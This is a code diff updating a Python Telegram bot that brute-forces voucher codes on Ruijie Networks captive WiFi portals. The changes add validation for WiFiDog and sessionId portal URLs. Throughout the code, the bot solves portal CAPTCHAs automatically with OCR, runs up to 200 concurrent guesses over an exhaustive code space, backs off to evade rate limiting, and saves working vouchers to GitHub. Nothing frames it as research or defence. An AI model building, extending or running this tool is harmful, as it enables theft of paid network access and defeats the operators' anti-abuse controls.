@@ -8,7 +8,7 @@ import ddddocr
 import numpy as np
 from datetime import datetime, timedelta, timezone
 
-# ⭐ NEW: Logging setup
+# ── Logging ───────────────────────────────────────────────────────────────
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
@@ -27,7 +27,7 @@ if not BOT_TOKEN:
     raise SystemExit("❌ BOT_TOKEN environment variable not set")
 
 # ── Constants ─────────────────────────────────────────────────────────────
-BOT_VERSION = "1.5.0"
+BOT_VERSION = "1.6.0"
 
 TG_MAX_LEN = 4000
 SUCCESS_CODE = asyncio.Queue()
@@ -45,19 +45,19 @@ last_scan_params = {}
 pending_brute = {}
 success_messages = {}
 limited_messages = {}
-_notified_invalid = set()   # ⭐ FIX: track chat_ids notified of invalid session
+_notified_invalid = set()
 
 session = None
 _connector = None
-CONCURRENCY = 200           # ⭐ FIX: reduced from 300 to balance higher retries
+CONCURRENCY = 200
 BATCH_SIZE = 500
-CAPTCHA_RETRY = 6           # ⭐ FIX: balanced (was 8)
-MAX_ATTEMPTS = 2            # ⭐ FIX: kept low to avoid request explosion
+CAPTCHA_RETRY = 6
+MAX_ATTEMPTS = 2
 PROGRESS_INTERVAL = 3
 GITHUB_INTERVAL = 30
-SESSION_RECHECK_INTERVAL = 900   # ⭐ FIX: 15 min (was 30 min)
+SESSION_RECHECK_INTERVAL = 900
 _voucher_sem = None
-_recheck_sem = asyncio.Semaphore(20)   # ⭐ NEW: limit concurrent rechecks
+_recheck_sem = asyncio.Semaphore(20)
 _start_time = time.monotonic()
 
 # ── Portal Configuration ──────────────────────────────────────────────────
@@ -98,16 +98,14 @@ DEFAULT_PORTAL = "portal-mm-as"
 
 
 def get_portal_config(session_url=None):
-    """Detect portal by subdomain boundary to avoid substring collision."""
     if session_url:
-        # Order matters: most-specific first
         for key in ("portal-mm-as", "portal-eu", "portal-as"):
             if f"//{key}." in session_url:
                 return PORTAL_CONFIGS[key], key
     return PORTAL_CONFIGS[DEFAULT_PORTAL], DEFAULT_PORTAL
 
 
-# ── Helper functions for message safety ───────────────────────────────────
+# ── Message safety helpers ────────────────────────────────────────────────
 def _truncate(text, limit=TG_MAX_LEN):
     if len(text) <= limit:
         return text
@@ -115,18 +113,14 @@ def _truncate(text, limit=TG_MAX_LEN):
 
 
 async def _safe_edit(chat_id, message_id, text, parse_mode=None):
-    """Edit message; ignore 'not modified' errors, fall back to new message."""
     text = _truncate(text)
     try:
         await bot.edit_message_text(
-            chat_id=chat_id,
-            message_id=message_id,
-            text=text,
-            parse_mode=parse_mode
+            chat_id=chat_id, message_id=message_id,
+            text=text, parse_mode=parse_mode
         )
         return message_id
     except Exception as e:
-        # ⭐ FIX: don't spam on "not modified"
         if "message is not modified" in str(e):
             return message_id
         log.warning(f"[_safe_edit] edit failed: {e}")
@@ -134,11 +128,11 @@ async def _safe_edit(chat_id, message_id, text, parse_mode=None):
             sent = await bot.send_message(chat_id, text, parse_mode=parse_mode)
             return sent.message_id
         except Exception as e2:
-            log.warning(f"[_safe_edit] fallback also failed: {e2}")
+            log.warning(f"[_safe_edit] fallback failed: {e2}")
             return message_id
 
 
-# ── Web server (keep alive) ────────────────────────────────────────────────
+# ── Web server ────────────────────────────────────────────────────────────
 async def handle(request):
     return web.Response(text="Bot is awake and running 24/7!")
 
@@ -153,7 +147,7 @@ async def web_server():
     await site.start()
 
 
-# ── GitHub helpers ─────────────────────────────────────────────────────────
+# ── GitHub helpers ────────────────────────────────────────────────────────
 async def get_file_content(path):
     url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
     headers = {"Authorization": f"token {GITHUB_TOKEN}"}
@@ -184,14 +178,12 @@ async def update_file_content(path, content, sha, message):
 
 # ── Plan / format helpers ─────────────────────────────────────────────────
 def plan_to_minutes(s):
-    """Parse plan strings like '3d', '1 month', '2hrs', '30 mins'."""
     if not s:
         return 0
     s = s.strip().lower()
     if s in ('unlimit', 'unlimited'):
         return float('inf')
     total = 0
-    # ⭐ FIX: broader unit matching
     for val, unit in re.findall(
         r'(\d+)\s*(months?|mo|mins?|minutes?|hrs?|hours?|days?|d|h|m)\b',
         s, re.I
@@ -292,7 +284,6 @@ def _parse_expire(expire_str):
 
 
 def is_expired(expire_str):
-    """⭐ FIX: timezone-aware comparison."""
     dt = _parse_expire(expire_str)
     if dt is None:
         return False
@@ -389,7 +380,7 @@ async def get_balance(token, portal_config):
                 "plan": "N/A", "expire": "N/A"}
 
 
-# ── ⭐ FIX: exhaustive code iterator ───────────────────────────────────────
+# ── Exhaustive code iterator ──────────────────────────────────────────────
 def iter_codes(mode, length):
     chars = {
         1: string.digits,
@@ -518,31 +509,65 @@ async def Varify_Captcha(session_obj, session_id, text, portal_config):
         return session_id if data.get("success") is True else None
 
 
-# ── ⭐ FIX: strict session URL validation ─────────────────────────────────
+# ── ⭐ FIX: session URL validation for BOTH URL formats ──────────────────
 async def check_session_url(session_url):
     """
-    Validate session URL by extracting a sessionId via get_session_id.
-    No false-positive fallback. Uses global session.
+    Validate session URL. Supports two formats:
+
+    Type A) WiFiDog URL — has gw_id= / mac= / gw_address=
+            → derive sessionId via redirect, then captcha-validate
+
+    Type B) Portal URL — already contains sessionId=xxx
+            → captcha-validate directly
+
+    A URL is valid ONLY if captcha image fetch succeeds with its sessionId.
     """
     if session is None or session.closed:
         log.warning("[check_session_url] global session not ready")
         return False
 
-    if 'mac=' not in session_url and 'gw_id' not in session_url:
-        log.info("[check_session_url] URL lacks mac=/gw_id")
-        return False
+    session_id = None
 
+    # ── Try to extract sessionId from URL directly (Type B) ─────────────
+    sid_match = re.search(r'[?&]sessionId=([a-zA-Z0-9]+)', session_url)
+    if sid_match:
+        session_id = sid_match.group(1)
+        log.info(f"[check_session_url] Type B — sessionId from URL: {session_id[:12]}...")
+
+    # ── Type A: WiFiDog URL — derive sessionId via redirect ─────────────
+    if not session_id:
+        has_wifidog = ('gw_id=' in session_url or 'mac=' in session_url
+                       or 'gw_address=' in session_url)
+        if not has_wifidog:
+            log.info("[check_session_url] no sessionId/mac=/gw_id in URL")
+            return False
+        try:
+            session_id = await get_session_id(session, session_url)
+        except asyncio.CancelledError:
+            raise
+        except Exception as e:
+            log.debug(f"[check_session_url] get_session_id failed: {e}")
+            return False
+
+        if not session_id:
+            log.info("[check_session_url] could not derive sessionId from WiFiDog URL")
+            return False
+        log.info(f"[check_session_url] Type A — derived sessionId: {session_id[:12]}...")
+
+    # ── Light validation: fetch captcha image with this sessionId ───────
+    portal_config, _ = get_portal_config(session_url)
     try:
-        session_id = await get_session_id(session, session_url)
-        if session_id:
-            log.info(f"[check_session_url] OK sessionId={session_id[:12]}...")
+        image = await Captcha_Image(session, session_id, portal_config)
+        if image and len(image) > 100:
+            log.info(f"[check_session_url] OK ✓ sessionId={session_id[:12]}... "
+                     f"(captcha {len(image)} bytes)")
             return True
-        log.info("[check_session_url] no sessionId extracted")
+        log.info(f"[check_session_url] captcha empty ({len(image) if image else 0} bytes)")
         return False
     except asyncio.CancelledError:
         raise
     except Exception as e:
-        log.debug(f"[check_session_url] error: {e}")
+        log.debug(f"[check_session_url] captcha check error: {e}")
         return False
 
 
@@ -562,7 +587,6 @@ async def perform_check(session_url, code, chat_id, scan_id=None,
     session_id = None
 
     for attempt in range(MAX_ATTEMPTS):
-        # ⭐ FIX: reset per attempt
         response = None
         session_id = None
         timeout = aiohttp.ClientTimeout(total=20)
@@ -573,7 +597,13 @@ async def perform_check(session_url, code, chat_id, scan_id=None,
                 cookie_jar=aiohttp.CookieJar(),
                 timeout=timeout
             ) as task_session:
-                session_id = await get_session_id(task_session, session_url)
+                # ── Prefer sessionId from URL if present ────────────────
+                sid_match = re.search(r'[?&]sessionId=([a-zA-Z0-9]+)', session_url)
+                if sid_match:
+                    session_id = sid_match.group(1)
+                else:
+                    session_id = await get_session_id(task_session, session_url)
+
                 if not session_id:
                     await asyncio.sleep(0.5 * (attempt + 1))
                     continue
@@ -630,7 +660,6 @@ async def perform_check(session_url, code, chat_id, scan_id=None,
                         status = req.status
                         response = await req.text()
 
-                    # ⭐ FIX: backoff on any rate-limit signal
                     if (status in (429, 502, 503, 504)) or ('request limited' in response):
                         wait = min(2 ** attempt, 6)
                         log.info(f"[perform_check] rate limited (HTTP {status}), waiting {wait}s")
@@ -685,7 +714,6 @@ async def perform_check(session_url, code, chat_id, scan_id=None,
                 return None
 
         success_texts.setdefault(chat_id, [])
-        # ⭐ FIX: dedup
         existing = {i["code"] for i in success_texts[chat_id]}
         if code not in existing:
             success_texts[chat_id].append({
@@ -733,7 +761,6 @@ async def perform_check(session_url, code, chat_id, scan_id=None,
         return code
 
     elif 'STA' in response:
-        # ⭐ FIX: cap list size
         limited_texts.setdefault(chat_id, [])
         limited_texts[chat_id] = (limited_texts[chat_id] + [code])[-200:]
 
@@ -787,7 +814,6 @@ async def run_bruteforce(mode, length, chat_id, session_url, scan_id,
                 except StopIteration:
                     break
             if not batch:
-                # ⭐ FIX: exhaustive iterator exhausted
                 await _safe_edit(chat_id, progress_msg.message_id,
                                  "✅ All codes checked (space exhausted).")
                 return
@@ -826,7 +852,6 @@ async def run_bruteforce(mode, length, chat_id, session_url, scan_id,
                     progress_msg.message_id = new_id
                 last_progress_update = now
     finally:
-        # ⭐ FIX: persist params on cancel (for /resume)
         data = scan_tasks.get(chat_id)
         if data and data.get("scan_id") == scan_id:
             if data.get("stop"):
@@ -864,7 +889,7 @@ async def github_update_scheduler():
                 await SUCCESS_CODE.put(item)
 
 
-# ── Session recheck scheduler (concurrent) ────────────────────────────────
+# ── Session recheck scheduler ─────────────────────────────────────────────
 async def _recheck_one(cid, url):
     async with _recheck_sem:
         try:
@@ -881,7 +906,6 @@ async def _recheck_one(cid, url):
             task_data = scan_tasks.get(cid)
             was_running = task_data and not task_data["task"].done()
             if was_running:
-                # ⭐ FIX: stop-only (no cancel) — loop exits cleanly, finally saves params
                 task_data["stop"] = True
 
             if cid not in _notified_invalid:
@@ -927,7 +951,7 @@ async def help_cmd(message):
         f"📚 **Command လမ်းညွှန်** (v{BOT_VERSION})\n\n"
         "၁။ **Setup**:\n"
         "   /setup <url>\n"
-        "   (portal-mm-as, portal-as, portal-eu URL)\n\n"
+        "   (WiFiDog URL သို့မဟုတ် Portal URL)\n\n"
         "၂။ **ရှာဖွေခြင်း**:\n"
         "   /brute <mode> <length> [target]\n"
         "   Mode:\n"
@@ -956,32 +980,37 @@ async def handle_setup(message):
         await bot.reply_to(message,
             "အသုံးပြုနည်း:\n"
             "/setup your_session_url\n\n"
-            "ဥပမာ:\n"
-            "https://portal-mm-as.ruijienetworks.com/...\n"
-            "https://portal-as.ruijienetworks.com/...\n"
-            "https://portal-eu.ruijienetworks.com/..."
+            "ဥပမာ (WiFiDog):\n"
+            "https://portal-mm-as.ruijienetworks.com/api/auth/wifidog?...\n\n"
+            "ဥပမာ (Portal):\n"
+            "https://portal-mm-as.ruijienetworks.com/download/static/maccauth/src/index.html?...&sessionId=..."
         )
         return
 
     url = args[1].strip()
     portal_config, portal_name = get_portal_config(url)
 
-    # ⭐ FIX: WiFiDog detection by protocol params
     is_wifidog = (
         ('gw_id=' in url and 'gw_address=' in url)
         or 'wifidog' in url.lower()
+        or '/api/auth/wifidog' in url.lower()
     )
+    has_session = bool(re.search(r'[?&]sessionId=[a-zA-Z0-9]+', url))
+
+    url_type = "WiFiDog" if is_wifidog else ("Portal" if has_session else "Unknown")
 
     await bot.reply_to(message,
-        f"Session URL စစ်ဆေးနေပါသည်...\n🌐 Portal: {portal_name}")
+        f"Session URL စစ်ဆေးနေပါသည်...\n"
+        f"🌐 Portal: {portal_name}\n"
+        f"📎 Type: {url_type}")
 
     if not await check_session_url(url):
         await bot.reply_to(message,
             "❌ Session URL မှားယွင်းနေပါသည်။\n\n"
             "ဖြစ်နိုင်တဲ့ အကြောင်းရင်းများ:\n"
-            "• URL မှာ mac= သို့မဟုတ် gw_id မပါ\n"
+            "• URL မှာ sessionId=, mac= သို့မဟုတ် gw_id= မပါ\n"
             "• Session သက်တမ်းကုန်သွားပြီ\n"
-            "• Portal က sessionId မပြန်ပေး")
+            "• Portal က captcha image မပြန်ပေး (session invalid)")
         return
 
     cid = message.chat.id
@@ -989,6 +1018,7 @@ async def handle_setup(message):
         'session_url': url,
         'portal_type': portal_name,
         'is_wifidog': is_wifidog,
+        'has_session_id': has_session,
         'last_recheck': time.monotonic(),
     }
 
@@ -1008,11 +1038,11 @@ async def handle_setup(message):
     except Exception as e:
         log.error(f"[setup] GitHub clear error: {e}")
 
-    wifidog_note = "\n📡 WiFiDog Portal detected" if is_wifidog else ""
+    type_note = f"\n📎 Type: {url_type}"
     await bot.reply_to(
         message,
         f"✅ Session URL သိမ်းဆည်းပြီးပါပြီ။\n"
-        f"🌐 Portal: {portal_name}{wifidog_note}\n"
+        f"🌐 Portal: {portal_name}{type_note}\n"
         f"/brute ဖြင့် စတင်ပါ။"
     )
 
@@ -1058,7 +1088,6 @@ async def brute(message):
         await bot.reply_to(message, "/setup ဖြင့် Session URL ထည့်ပါ။")
         return
 
-    # ⭐ FIX: reject if a scan is already running
     existing = scan_tasks.get(chat_id)
     if existing and not existing["task"].done():
         await bot.reply_to(message,
@@ -1116,7 +1145,6 @@ async def stop_scan(message):
     chat_id = message.chat.id
     data = scan_tasks.get(chat_id)
     if data and not data["task"].done():
-        # ⭐ FIX: stop-only — loop exits cleanly, finally persists params
         data["stop"] = True
         await bot.reply_to(message,
             "Scan ရပ်ထားပါသည်။ ပြန်စလိုပါက /resume ကိုသုံးပါ။")
@@ -1346,6 +1374,7 @@ async def status(message):
             sem_info = f"?/{CONCURRENCY}"
 
     wifidog_count = sum(1 for d in user_data.values() if d.get('is_wifidog', False))
+    sessionid_count = sum(1 for d in user_data.values() if d.get('has_session_id', False))
 
     try:
         qsize = SUCCESS_CODE.qsize()
@@ -1368,6 +1397,7 @@ async def status(message):
         f"   └ {running_str}\n"
         f"👥 Sessions Loaded: {len(user_data)}\n"
         f"📡 WiFiDog Sessions: {wifidog_count}\n"
+        f"🔑 Portal Sessions: {sessionid_count}\n"
         f"⚠️ Invalid Sessions: {len(_notified_invalid)}\n"
         f"⚡ Concurrency Limit: {CONCURRENCY}\n"
         f"🔒 Semaphore In-Use: {sem_info}\n"
